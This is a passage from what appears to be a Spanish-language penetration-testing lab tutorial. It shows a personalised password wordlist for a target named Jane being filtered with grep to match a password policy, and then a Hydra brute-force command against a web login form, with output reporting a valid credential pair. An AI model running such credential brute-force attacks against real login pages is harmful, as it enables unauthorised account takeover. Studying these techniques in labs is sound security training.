[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

- **Longitud mínima:** 6 caracteres.
    
- **Debe incluir:**
    
    - Al menos una letra mayúscula.
        
    - Al menos una letra minúscula.
        
    - Al menos un número.
        
    - Al menos dos caracteres especiales (del conjunto `!@#$%^&*`).

Como hicimos anteriormente, podemos usar grep para filtrar esa lista de contraseñas y que coincida con esa política:

```shell-session
$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Este comando filtra eficazmente jane.txt para que coincida con la política proporcionada, pasando de ~46 000 contraseñas a unas ~7900 posibles. Primero garantiza una longitud mínima de 6 caracteres, luego comprueba que haya al menos una letra mayúscula, una letra minúscula, un número y, por último, al menos dos caracteres especiales del conjunto especificado. Los resultados filtrados se almacenan en jane-filtered.txt.

```shell-session
$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```